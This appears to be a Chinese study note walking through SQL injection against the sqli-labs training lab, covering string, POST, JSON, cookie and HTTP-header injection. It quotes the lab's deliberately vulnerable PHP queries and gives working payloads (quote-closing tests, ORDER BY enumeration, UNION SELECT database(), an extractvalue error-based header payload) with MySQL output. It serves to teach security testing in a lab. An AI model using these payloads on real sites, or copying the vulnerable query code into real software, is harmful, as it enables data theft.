---
title: ".trash - 参数提交注入"
category: ".trash"
date: 2026-04-09
published: 2026-04-09
author: "Rin"
---

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png)

```
#简要明确参数类型
数字，字符，搜索，JsoN等

#简要明确请求方法
GET, POST,COOKIE，REQUEST，HTTP头等

其中sql语句干扰符号: ',",s,),}等，具体需看写法
```

### 1、参数字符型注入测试

=>sqlilabs less 5 6

在靶场中查看源代码

```
root@9a845c5ed654:/var/www/html/Less-5# cat index.php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-5 Double Query- Single Quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";		#SQL执行的语句
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else
        {

        echo '<font size="3" color="#FFFF00">';
        print_r(mysql_error());
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
        else { echo "Please input the ID as parameter with numeric value";}

?>

</font> </div></br></br></br><center>
<img src="../images/Less-5.jpg" /></center>
</body>
</html>
```

`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`SQL执行的语句是采用了''闭合,

我们要是直接使用?id=1 and 1=1相当于执行的是`SELECT * FROM users WHERE id='1 and 1=1' LIMIT 0,1;`是不会有任何的反应。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072601160-2484f555-bbf7-4484-8b0b-d96d77a7971d.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072577561-c1623923-a123-460e-886d-760b5b6857d3.png)

正确的报错语句

```
http://10.1.1.133/Less-5/?id=1' and '1'='1
http://10.1.1.133/Less-5/?id=1' and '1'='2
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072759799-6db0cad1-0771-47b3-9b2d-8ac012959115.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072783472-75a5865e-986e-4891-8857-08b2060d6931.png)

在浏览器中解释执行的%27是'

在数据库中执行语句为

```
mysql> SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1;
Empty set (0.00 sec)

mysql>
```

获取字段

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624073239739-f9ec5c37-4727-4789-b624-dd0e961acaae.png)

--+是将后面的代码注释不执行

在数据库中执行

```
mysql> SELECT * FROM users WHERE id='1' order by 4;
ERROR 1054 (42S22): Unknown column '4' in 'order clause'
mysql> SELECT * FROM users WHERE id='1' order by 3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql>
```

**Less-6代码查看**

```
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

采用双引号的方式进行了编码，绕过方法"闭合前面的引号后面采用--+注释

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624073840355-7478a4e9-af4b-4ecd-ac53-b74c1d27c1de.png)

### 2、POST数据提交注入测试

=>sqlilabs less 11

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624073988590-dddf9a60-7059-4daa-a761-2b1a9736f0db.png)

用户和密码都正确提交

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624074324974-451c5291-dbe4-469f-83aa-1d714163498c.png)

在代码中查看代码的书写

```
57          @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
58          $result=mysql_query($sql);
59          $row = mysql_fetch_array($result);

为了实验方便将下面回显sql执行命令
57          @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
58					echo $sql;
59          $result=mysql_query($sql);
60          $row = mysql_fetch_array($result);
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624075970638-292c8f75-2850-4bfe-bf05-047195cbb375.png)

**用hackbar模拟post数据提交测试**

以下操作使用hackbar进行渗透测试，hackbar安装地址：[https://github.com/HCTYMFF/hackbar2.1.3](https://github.com/HCTYMFF/hackbar2.1.3)

一般的登录情况都是采用的post提交数据、通过抓包获取到登录信息将它放在hackbar中进行登录测试，也是为了验证hackbar是否能正常使用，要是确认hackbar能正常使用这个可以跳过。

在burp抓包获取登录信息

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624241755273-c100946d-1708-42be-b6e7-fa1ee4ebce96.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624241636574-bdef0df4-2e9c-4ab9-847b-e354deb653fc.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624241841343-0d3c1777-07c2-4651-b133-c1fc5e43ec32.png)

  

枚举数据库字段

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624243154597-dc349d95-8d32-4a5b-885c-dabd44a94461.png)

```
uname=admin' order by 3#&passwd=admin&submit=Submit				
```

备注：在mysql中一般注释后面的字句是采用的--+在有些的字句中采用#注释。需要多测试才能发现，为了验证#是注释符号将#替换为--+执行查看结果看到报错信息。

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624243932293-1f9bb2e9-f747-4eaa-b5e6-2c9057c062cd.png)

在数据库中执行，最终验证#是注释了后面的字句。

```
mysql> select username,password from users where username='admin' and 1=2 union select 1,2 --+ and password='admin' limit 0 1
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and password='admin' limit 0 1' at line 1
mysql>

将--+替换为#
mysql> select username,password from users where username='admin' and 1=2 union select 1,2 # and password='admin' limit 0 1
    -> ;
+----------+----------+
| username | password |
+----------+----------+
| 1        | 2        |
+----------+----------+
1 row in set (0.00 sec)

mysql>
```

  

将order by 3改为2查看

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624243355285-372c596a-8a9d-4ca8-9a29-af3d6b7948db.png)

```
uname=admin' order by 2#&passwd=admin&submit=Submit			
```

这里看到我们登陆成功，但实际上我们登陆的用户名和密码是错误的因为只是将sql语句注入进去没有报错下面的语句正常的执行就显示登陆成功，换句话说登录到情况只有两个字段。很可能就是用户名和密码。

枚举出数据库名称:

```
uname=admin' and 1=2 union select database(),2 #&passwd=admin&submit=Submit
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624244411382-f6df356e-00e3-42e0-bf40-e171ec72c05d.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624244556975-7ae64a8f-ca9a-4437-b392-25ef4d5dbd73.png)

### 3、参数JSON数据注入测试

=>本地环境代码演示

json格式

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337366270-9545e393-0955-4f43-8628-4fb037a0cd53.png)

json注入

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337757521-14b7e701-9024-4ef6-9696-83c7fcef0409.png)

  

注入方式：如果是数字的可以不加'闭合如果是字符的话，加上"闭合

### 4、COOKIE数据提交注入测试

=>sqlilabs less 20

**网站传递参数的方式**

|          |              |
| -------- | ------------ |
| **参数类型** | **含义**       |
| get型     | 一般访问网页的行为    |
| cookie型  | 伴随着所有访问网页的行为 |
| post型    | 上传文件，登陆      |
|          |              |

**cookie注入原理** 对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。

【cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。】

|   |   |
|---|---|
|条件|含义|
|条件1|程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤|
|条件2|条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。<br><br>[  <br>  <br>  <br>  <br>  <br>  <br>](https://blog.csdn.net/qq_41901122/article/details/104442129)|

通过burp抓包分析

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330249164-46752144-cee4-4c22-8d5c-b07f2ce549e1.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330271540-5e82be77-92ac-4e25-8794-87e8f1081130.png)![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330319309-c63781a0-ea20-4cff-aeb2-fec5bb9d8337.png)

将这个数据包发送到repeater模块当中  
![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330418483-a5af2071-3de4-4f4e-a267-1cf7671d9c67.png)

修改cookie参数`Cookie: uname=admin' and 1=2 union select database(),2,3 #`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330466330-95b4e933-734b-4595-a2bc-6a04e756ad0d.png)

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330510841-e0949cb4-08b5-4267-bb24-a8eb004f2e2e.png)

### 5、HTTP头部参数数据注入测试

=>sqlilabs less 18

查看数据库源代码

```
       $sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,                                   1";
        $result1 = mysql_query($sql);
        $row1 = mysql_fetch_array($result1);
                if($row1)
                        {
                        echo '<font color= "#FFFF00" font size = 3 >';
                        $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
                        mysql_query($insert);
                        //echo 'Your IP ADDRESS is: ' .$IP;
                        echo "</font>";
                        //echo "<br>";
                        echo '<font color= "#0000ff" font size = 3 >';
                        echo 'Your User Agent is: ' .$uagent;
                        echo "</font>";
                        echo "<br>";
                        print_r(mysql_error());
                        echo "<br><br>";
                        echo '<img src="../images/flag.jpg"  />';
                        echo "<br>";

                        }
                else
                        {
                        echo '<font color= "#0000ff" font size="3">';
                        //echo "Try again looser";
                        print_r(mysql_error());
                        echo "</br>";
                        echo "</br>";
                        echo '<img src="../images/slap.jpg"   />';
                        echo "</font>";
                        }
```

从上面的SQL语句当中我们可以看到对执行的insert语句没有任何的限制也就是说我们通过修改http的头部信息可以达到SQL注入的效果。

为了实验方便我在第103行下面添加一行显示SQL语句执行的显示界面`echo $insert;`

```
root@eafc9e16990f:/var/www/html/Less-18# tail -36 index.php |head -2
                        $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
                        echo $insert;
root@eafc9e16990f:/var/www/html/Less-18#
```

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624332396656-e0ea6f63-0de0-4a35-a2b5-ccffae4c488d.png)

修改数据包注入获取数据库名称`'and extractvalue (1,concat(0x7e,(select database()),0x7e)) and'`

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624334576219-8186bbd3-31c1-4822-9004-9c73d26d0d8d.png)

获取用户名

![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624334639920-e1622fd2-9950-471d-8b04-8197e857cfd5.png)